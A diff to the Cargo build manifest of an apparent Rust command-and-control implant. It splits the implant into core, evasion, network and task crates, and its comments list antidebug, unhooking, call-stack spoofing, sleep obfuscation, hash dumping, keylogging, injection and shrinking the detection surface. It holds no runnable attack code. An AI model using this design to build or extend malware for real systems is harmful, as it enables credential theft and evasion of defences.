@@ -13,8 +13,16 @@ default = []
 # Gate the ~50 #[no_mangle] nyx_selftest_* / nyx_linger* rundll32 exports
 # behind this feature (P1-11b). Production builds (default features) exclude
 # all selftest exports - the largest avoidable detection surface. Test/debug
-# builds use --features selftest to include them.
-selftest = []
+# builds use --features selftest to include them. Forwarded to nyx-implant-core
+# (fmt::push_decimal_u64 + the nyx_selftest_rt_steps export live there), to
+# nyx-implant-evasion (the nyx_selftest_hookchain{,_full} / nyx_selftest_envprobe
+# exports live there) and to nyx-implant-tasks (the ~53 nyx_selftest_* /
+# nyx_linger selftests.rs exports + nyx_selftest_trex live there).
+selftest = [
+    "nyx-implant-core/selftest",
+    "nyx-implant-evasion/selftest",
+    "nyx-implant-tasks/selftest",
+]
 
 # Standalone (NOT in the root workspace) so the dev-host stable workspace stays
 # green. Declares its own (empty) workspace to decouple from the root members.
@@ -25,40 +33,35 @@ selftest = []
 crate-type = ["cdylib"]
 
 [dependencies]
+# Core layer (WP-C crate split): heap/cell/fmt/resolve/ntalloc/unhook/stack/
+# version/syscalls/context/hostinfo/config/diag live there now; lib.rs
+# re-exports them so entry.rs keeps its `crate::<mod>::` paths.
+nyx-implant-core = { path = "../implant-core" }
+# Evasion layer (WP-C crate split, step 2): antidebug/blind/blind_hwbp/
+# cfg_user/proxy_veh/caller_spoof/hookchain/lacuna/lacuna_stomp/sleep/
+# fluctuation(+thunk)/mem/insomniac/envprobe/evasion_glue live there now;
+# lib.rs re-exports them so entry.rs keeps its `crate::<mod>::` paths.
+nyx-implant-evasion = { path = "../implant-evasion" }
+# Net layer (WP-C crate split, step 3): envelopes/transport/channels live
+# there now; lib.rs re-exports them so entry.rs keeps its `crate::transport::`
+# path. No feature forwarding — net has no selftest-gated items (the gates
+# live on the callers in selftests.rs / entry.rs).
+nyx-implant-net = { path = "../implant-net" }
+# Tasks layer (WP-C crate split, step 4): beacon/bof/config_placeholder/
+# env_keying/fs/hashdump/inject/keylog/kits/pivot/postex/recon/screenshot/
+# shell/task_guard/tp/trex/selftests live there now; lib.rs re-exports them
+# (plus their #[no_mangle] keep-alives) so entry.rs keeps its
+# `crate::<mod>::` paths.
+nyx-implant-tasks = { path = "../implant-tasks" }
 # Path deps (this crate is standalone, outside the root workspace). protocol
 # builds WITHOUT its `std` feature here — the implant is #![no_std], so pulling
 # in std would duplicate the panic_impl lang item.
 nyx-protocol = { path = "../protocol", default-features = false }
-# Evasion kit: SSN resolution + indirect-syscall stub templates. The resolve
-# module implements SyscallSource over the live ntdll, turning these algorithms
-# into a runtime.
-nyx-evasion = { path = "../evasion" }
-# COFF/BOF loader core (no_std-compatible): parse + relocate a CS-compatible
-# BOF object file. The implant's bof.rs maps sections W^X and runs them.
-nyx-coff = { path = "../coff" }
-# Userland evasion kit seams (no_std): pure-Rust gap/frame/rc4 algorithm cores
-# + trait seams. The implant feeds live .pdata bytes (read via the PEB walk in
-# resolve.rs) into gap::enumerate_gaps; the math lives ONLY here so the PIC
-# implant never re-implements it. See docs/WINDOWS_DEV.md §4 (P2.1a-i).
+# Userland evasion kit seams (no_std): entry.rs drives PdataGapScanner /
+# swap::decide for the call-stack-swap decision. (The COFF loader core moved
+# to nyx-implant-tasks with bof.rs; the SSN-resolution kit is only used by
+# nyx-implant-core's resolve/syscalls modules now.)
 nyx-implant-evasionsdk = { path = "../implant-evasionsdk", default-features = false }
-# Per-build encrypted config. no_std feature → only `decrypt` is pulled in
-# (chacha20poly1305 + alloc; no rand/getrandom). build.rs encrypts the config
-# on the host (std) and bakes key/nonce/ciphertext into OUT_DIR/config_blob.rs;
-# the runtime crate only decrypts.
-nyx-config = { path = "../config", default-features = false, features = ["no_std"] }
-# Malleable C2 transform engine (no_std): the implant applies the http-post
-# client envelope to each request body and inverts the server envelope on each
-# response. build.rs resolves the profile host-side (std) and bakes the
-# resolved Step/Terminator lists; the runtime crate only encodes/decodes.
-nyx-profile = { path = "../profile", default-features = false, features = ["no_std"] }
-
-[build-dependencies]
-# build.rs encrypts the config blob per-build (host-side, std). Needs the
-# `std` feature for nyx_config::encrypt (OsRng-backed).
-nyx-config = { path = "../config" }
-# build.rs parses NYX_PROFILE (host-side, std) and bakes the resolved envelope
-# Step/Terminator lists into OUT_DIR/envelopes.rs for the runtime crate.
-nyx-profile = { path = "../profile" }
 
 # no_std PIC: dev/check builds must abort too — there's no unwinding without
 # std, so any debug panic path (e.g. integer-overflow checks) would otherwise
